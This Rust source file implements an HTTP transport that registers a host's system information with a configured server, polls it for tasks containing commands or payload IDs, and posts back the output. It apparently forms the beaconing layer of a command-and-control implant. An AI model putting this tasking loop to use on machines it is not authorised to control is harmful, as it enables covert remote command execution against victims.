use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::config::Config;
use crate::error::Error;
use crate::system_info::SystemInfo;

#[derive(Deserialize, Debug, Clone)]
pub struct Task {
    #[serde(rename = "type")]
    pub task_type: String,

    pub command: Option<String>,

    pub payload_id: Option<String>,
}

#[derive(Serialize)]
struct ResultReq {
    output: String,
}

#[derive(Deserialize)]
struct RegisterRespData {
    id: String,
}

pub trait Transport: Send + Sync {
    fn register(
        &self,
        info: &SystemInfo,
    ) -> Result<String, Error>;

    fn get_task(
        &self,
        id: &str,
    ) -> Result<Task, Error>;

    fn send_result(
        &self,
        id: &str,
        output: &str,
    ) -> Result<(), Error>;
}

pub struct HttpTransport {
    client: ureq::Agent,
    base_url: String,
}

impl HttpTransport {
    pub fn new(config: &Config) -> Self {
        let client = ureq::AgentBuilder::new()
            .timeout_connect(Duration::from_secs(10))
            .timeout(Duration::from_secs(30))
            .user_agent(&config.user_agent)
            .build();

        Self {
            client,
            base_url: config.server_url.clone(),
        }
    }
}

impl Transport for HttpTransport {
    fn register(
        &self,
        info: &SystemInfo,
    ) -> Result<String, Error> {
        let body =
            serde_json::to_string(info)?;

        let resp = self
            .client
            .post(&format!(
                "{}/register",
                self.base_url
            ))
            .set(
                "Content-Type",
                "application/json",
            )
            .send_string(&body)?;

        let parsed: RegisterRespData =
            serde_json::from_str(
                &resp.into_string()?,
            )?;

        Ok(parsed.id)
    }

    fn get_task(
        &self,
        id: &str,
    ) -> Result<Task, Error> {
        let resp = self
            .client
            .get(&format!(
                "{}/task?id={id}",
                self.base_url
            ))
            .call()?;

        let task: Task =
            serde_json::from_str(
                &resp.into_string()?,
            )?;

        Ok(task)
    }

    fn send_result(
        &self,
        id: &str,
        output: &str,
    ) -> Result<(), Error> {
        let body =
            serde_json::to_string(
                &ResultReq {
                    output: output.to_string(),
                },
            )?;

        self.client
            .post(&format!(
                "{}/result?id={id}",
                self.base_url
            ))
            .set(
                "Content-Type",
                "application/json",
            )
            .send_string(&body)?;

        Ok(())
    }
}